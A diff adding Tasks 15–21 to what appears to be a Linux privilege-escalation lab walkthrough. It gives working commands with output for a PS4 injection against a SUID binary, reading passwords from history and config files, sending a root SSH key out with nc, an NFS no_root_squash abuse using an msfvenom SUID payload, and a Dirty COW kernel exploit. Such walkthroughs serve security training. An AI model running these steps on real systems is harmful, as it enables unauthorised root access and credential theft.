@@ -628,3 +628,259 @@ In Bash versions < 4.2-048 you can create shell functions with names that look l
     root@debian:~# whoami
     root
     ```
+# Task 15 - SUID / SGID Executables - Abusing Shell Features 2
+Exploit for Bash version 4.4 > and utilizing the PS4 variable
+* Run example program with debugging and the PS4 variable
+    ```
+    user@debian:~$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+    /usr/sbin/service apache2 start
+    basename /usr/sbin/service
+    VERSION='service ver. 0.91-ubuntu1'
+    basename /usr/sbin/service
+    USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
+    SERVICE=
+    ACTION=
+    SERVICEDIR=/etc/init.d
+    OPTIONS=
+    '[' 2 -eq 0 ']'
+    cd /
+    '[' 2 -gt 0 ']'
+    case "${1}" in
+    '[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
+    '[' 2 -eq 2 -a start = --full-restart ']'
+    '[' -z '' ']'
+    SERVICE=apache2
+    shift
+    '[' 1 -gt 0 ']'
+    case "${1}" in
+    '[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
+    '[' 1 -eq 2 -a '' = --full-restart ']'
+    '[' -z apache2 ']'
+    '[' -z '' ']'
+    ACTION=start
+    shift
+    '[' 0 -gt 0 ']'
+    '[' -r /etc/init/apache2.conf ']'
+    '[' -x /etc/init.d/apache2 ']'
+    exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
+    Starting web server: apache2httpd (pid 1661) already running
+    ```
+* Run /tmp/rootbash
+    ```
+    user@debian:~$ /tmp/rootbash -p
+    rootbash-4.1# whoami
+    root
+    ```
+# Task 16 - Passwords & Keys - History Files
+Linux history stores what you type at the CLI
+* View history
+    ```
+    user@debian:~$ cat ~/.*history | grep root
+    mysql -h somehost.local -uroot -ppassword123
+    ```
+* History showed us someone connected to MySQL with the root user/pass, su to verify
+    ```
+    user@debian:~$ su root
+    Password: 
+    root@debian:/home/user# whoami
+    root
+    root@debian:/home/user# 
+    ```
+# Task 17 - Passwords & Keys - Config Files
+There are many different config files on the system and often they contain creds in plaintext
+* Check example ovpn file
+    ```
+    user@debian:~$ cat myvpn.ovpn | grep pass
+    auth-user-pass /etc/openvpn/auth.txt
+    ```
+* Check example auth file
+    ```
+    user@debian:~$ cat /etc/openvpn/auth.txt 
+    root
+    password123
+    ```
+* Verify with su
+    ```
+    user@debian:~$ su root
+    Password: 
+    root@debian:/home/user# whoami
+    root
+    root@debian:/home/user# exit
+    exit
+    ```
+# Task 18 - Passwords & Keys - SSH Keys
+SSH keys are often stored in backups that may have misconfigured permissions
+* Check the root directory for hidden files and directories
+    ```
+    user@debian:~$ ls -ld /.??*
+    drwxr-xr-x 2 root root 4096 Aug 25  2019 /.ssh
+    ```
+* Check hidden directory
+    ```
+    user@debian:~$ ls -lrta /.ssh
+    total 12
+    -rw-r--r--  1 root root 1679 Aug 25  2019 root_key
+    drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
+    drwxr-xr-x  2 root root 4096 Aug 25  2019 .
+    ```
+* root_key appears to be the private key for the root user, copy to your attacking system and verify, setup listener to receive key
+    ```
+    nc -nvlp 1234 > root_key
+    listening on [any] 1234 ...
+    ```
+* Transfer key
+    ```
+    user@debian:~$ nc -w 3 a.b.c.d 1234 < /.ssh/root_key
+    user@debian:~$     
+    ```
+* Set key permissions and test
+    ```
+    ls -lrta root_key
+    -rw-r--r-- 1 abc abc 1679 Jan 31 13:05 root_key
+
+    chmod 600 root_key
+
+    ls -lrta root_key
+    -rw------- 1 abc abc 1679 Jan 31 13:05 root_key
+
+    ssh -i root_key root@10.10.13.2
+
+    Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+    The programs included with the Debian GNU/Linux system are free software;
+    the exact distribution terms for each program are described in the
+    individual files in /usr/share/doc/*/copyright.
+
+    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+    permitted by applicable law.
+    Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
+    root@debian:~# id
+    uid=0(root) gid=0(root) groups=0(root)
+    root@debian:~# 
+    ```
+# Task 19 - NFS
+NFS is a network based file system that allows access to files over the network.  When a file is created with NFS it will inherit the remote user's ID.  If that user happens to be root and root squashing is enabled, the ID will be nobody
+* Check current NFS configuration
+    ```
+    user@debian:~$ cat /etc/exports
+    # /etc/exports: the access control list for filesystems which may be exported
+    #               to NFS clients.  See exports(5).
+    #
+    # Example for NFSv2 and NFSv3:
+    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+    #
+    # Example for NFSv4:
+    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+    #
+
+    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+    #/tmp *(rw,sync,insecure,no_subtree_check)
+    ```
+* In the above example, /tmp has root squashing disabled (no_root_squash)
+* On your local machine, switch to the root user and then setup a local NFS directory
+    ```
+    sudo su
+    
+    mkdir /tmp/nfs
+
+    mount -o rw,vers=2 10.10.13.2:/tmp /tmp/nfs
+    ```
+* As the local root user, create a payload with msfvenom and save it on the mounted share
+    ```
+    msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+
+    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+    [-] No arch selected, selecting arch: x86 from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 48 bytes
+    Final size of elf file: 132 bytes
+    Saved as: /tmp/nfs/shell.elf
+
+    ls -lrta /tmp/nfs/shell.elf
+    -rw-r--r-- 1 root root 132 Jan 31 13:15 /tmp/nfs/shell.elf
+
+    chmod +xs /tmp/nfs/shell.elf
+    ```
+* Verify the file on the remote system
+    ```
+    user@debian:~$ cd /tmp
+
+    user@debian:/tmp$ ls -lrta shell.elf
+    -rwsr-sr-x 1 root root 132 Jan 31 13:15 shell.elf
+    ```
+* Execute shell.elf
+    ```
+    user@debian:/tmp$ /tmp/shell.elf
+    bash-4.1# id
+    uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+    bash-4.1# 
+    ```
+# Task 20 - Kernel Exploits
+Kernel exploits should be used as a last resort since they can crash the system
+* Use Linux Exploit Suggester 2 to identify exploits
+    ```
+    user@debian:/tmp$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl  
+                                                            
+    #############################                            
+        Linux Exploit Suggester 2                              
+    #############################                            
+                                                            
+    Local Kernel: 2.6.32                                     
+    Searching 72 exploits...                                 
+                                                            
+    Possible Exploits                                        
+    [1] american-sign-language                               
+        CVE-2010-4347                                        
+        Source: http://www.securityfocus.com/bid/45408       
+    [2] can_bcm                                              
+        CVE-2010-2959                                        
+        Source: http://www.exploit-db.com/exploits/14814
+    [3] dirty_cow
+        CVE-2016-5195
+        Source: http://www.exploit-db.com/exploits/40616
+    [4] exploit_x
+        CVE-2018-14665
+        Source: http://www.exploit-db.com/exploits/45697
+    [5] half_nelson1
+        Alt: econet       CVE-2010-3848
+        Source: http://www.exploit-db.com/exploits/17787
+    [6] half_nelson2
+        Alt: econet       CVE-2010-3850
+        Source: http://www.exploit-db.com/exploits/17787
+    ...
+    ...
+    ...
+    ```
+* Dirty COW is a popular exploit and this system happens to be vulnerable to it, compile and run the example code
+    ```
+    user@debian:/tmp$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+    user@debian:/tmp$ ./c0w
+                                    
+    (___)                                   
+    (o o)_____/                             
+        @@ `     \                            
+        \ ____, //usr/bin/passwd                          
+        //    //                              
+        ^^    ^^                               
+    DirtyCow root privilege escalation
+    Backing up /usr/bin/passwd to /tmp/bak
+    mmap af745000
+
+    madvise 0
+
+    ptrace 0
+    ```
+* Run /usr/bin/passwd
+    ```
+    user@debian:/tmp$ /usr/bin/passwd
+    root@debian:/tmp# id
+    uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+    root@debian:/tmp# 
+    ```
+# Task 21 - Privilege Escalation Scripts
+* Example privilege escalation scripts include
+    * linpeas
+    * lse
+    * LinEnum
